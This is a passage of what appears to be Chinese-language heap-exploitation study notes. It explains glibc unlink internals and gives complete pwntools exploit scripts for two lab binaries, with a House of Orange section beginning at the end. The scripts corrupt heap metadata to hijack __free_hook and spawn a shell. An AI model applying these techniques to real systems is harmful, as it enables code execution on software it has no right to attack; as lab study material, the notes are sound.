(!in_smallbin_range (P-&gt;size)\</span><br><span class="hljs-meta">        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;\</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)\</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;\</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\</span><br><span class="hljs-meta">                &#125;\</span><br><span class="hljs-meta">            &#125; <span class="hljs-keyword">else</span> &#123;\</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\</span><br><span class="hljs-meta">            &#125;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">&#125;</span><br><br></code></pre></td></tr></table></figure><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>这项技术只能在GLIBC版本&lt;=2.3.3的情况下使用，safe unlink  是在2004年GLIBC版本2.3.4中引入的，而GLIBC版本如此之老并不常见。这项技术最初是用来对付没有NX/DEP的平台的，这里也是这样描述的。2003年，AMD在他们的消费者桌面处理器中引入了硬件NX支持，随后英特尔在2004年也引入了，因此没有这种保护的系统并不常见。</p><h4 id="示例一-unsafe-unlink"><a href="#示例一-unsafe-unlink" class="headerlink" title="示例一 unsafe_unlink"></a>示例一 unsafe_unlink</h4><blockquote><p>文件详见 <a href="attachment/unsafe_unlink/unsafe_unlink">unsafe_unlink</a></p></blockquote><h5 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/unsafe_unlink]<br>└─$ checksec unsafe_unlink<br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/unsafe_unlink/unsafe_unlink&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      PIE enabled<br>    RWX:      Has RWX segments<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.23_unsafe-unlink&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p>由于是古老时代的unlink，没有基于fd，及bk的安全检查，利用unlink的反射写入来修改<code>__free_hook</code>，从而执行shellcode</p><p><img src="Heap.assets/image-20220916151609194.png" alt="image-20220916151609194"></p></li></ul><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;unsafe_unlink&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;edit&quot; option; send index &amp; data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br><br><span class="hljs-comment"># This binary leaks the heap start address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;heap @ &quot;</span>)<br>heap = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># Prepare execve(&quot;/bin/sh&quot;) shellcode with a jmp over where the fd will be written.</span><br>shellcode = asm(<span class="hljs-string">&quot;jmp shellcode;&quot;</span> + <span class="hljs-string">&quot;nop;&quot;</span>*<span class="hljs-number">0x16</span> + <span class="hljs-string">&quot;shellcode:&quot;</span> + shellcraft.execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br>chunk_A = malloc(<span class="hljs-number">0x88</span>)<br>chunk_B = malloc(<span class="hljs-number">0x88</span>)<br><br>fd = libc.sym.__free_hook - <span class="hljs-number">0x18</span><br>bk = heap + <span class="hljs-number">0x20</span><br><br>edit(chunk_A, pack(fd) + pack(bk) + shellcode.ljust(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x90</span>)*<span class="hljs-number">2</span>)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="Unlink-new"><a href="#Unlink-new" class="headerlink" title="Unlink(new)"></a>Unlink(<del>new</del>)</h3><h4 id="详情-3"><a href="#详情-3" class="headerlink" title="详情"></a>详情</h4><p><img src="Heap.assets/image-20220916180441088.png" alt="image-20220916180441088"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>    &#125;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>&#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>伪造一个假的chunk，从合法chunk的用户数据的第一个四字开始，将其fd和bk分别指向用 户数据指针之前的0x18和0x10字节，它们位于该chunk中。为后续的数据块设计一个prev_size 字段，比前一个数据块的实际大小少0x10字节。利用一个溢出错误来清除后继块的prev_inuse位，当这个块被释放时，malloc将试图把它与假的块向后合并。假的块的fd所指向的块的bk指向假的块，而假的块的bk所指向的块的fd也指向假的块，满足了safe link的检查。解除链接过程的结果是，假块的指针（指向合法块的用户数据的指针）被覆盖为自身的地址减去0x18。</p><p><img src="Heap.assets/image-20220916182208311.png" alt="image-20220916182208311"></p><h4 id="示例一-safe-unlink"><a href="#示例一-safe-unlink" class="headerlink" title="示例一  safe unlink"></a>示例一  safe unlink</h4><blockquote><p>文件详见<a href="attachment/safe_unlink/safe_unlink">safe_unlink</a></p></blockquote><h5 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/safe_unlink]<br>└─$ checksec safe_unlink<br>[*] &#x27;/home/fanya/Desktop/heap/heaplab/part1/safe_unlink/safe_unlink&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  &#x27;../.glibc/glibc_2.30_no-tcache&#x27;<br></code></pre></td></tr></table></figure><h5 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li>因为存在一个<code>m_array</code>来储存所申请的chunk，从而方便unlink的利用，从而修改<code>__free_hook</code>。</li></ul><h5 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;safe_unlink&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;edit&quot; option; send index &amp; data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br>info(<span class="hljs-string">f&quot;m_array @ 0x<span class="hljs-subst">&#123;elf.sym.m_array:02x&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Request 2 small chunks.</span><br>chunk_A = malloc(<span class="hljs-number">0x88</span>)<br>chunk_B = malloc(<span class="hljs-number">0x88</span>)<br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># Prepare fake chunk metadata.</span><br>fd = elf.sym.m_array - <span class="hljs-number">0x18</span><br>bk = elf.sym.m_array - <span class="hljs-number">0x10</span><br>prev_size = <span class="hljs-number">0x80</span><br>fake_size = <span class="hljs-number">0x90</span><br>edit(chunk_A, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x80</span>) + p64(fd) + p64(bk) + p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x60</span> + p64(prev_size) + p64(fake_size))<br><br><span class="hljs-comment"># pause()</span><br>free(chunk_B)<br><br>edit(chunk_A, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(libc.sym.__free_hook - <span class="hljs-number">0x8</span>))<br>edit(chunk_A, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym.system ))<br>free(chunk_A)<br><br><br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p><img src="Heap.assets/image-20220929171044220.png" alt="image-20220929171044220"></p><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br><br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt;  ptype /o FILE<br>pwndbg&gt;  ptype /o <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>  </span><br><span class="hljs-class">/* <span class="hljs-title">offset</span>    |  <span class="hljs-title">size</span> */  <span class="hljs-title">type</span> =</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> 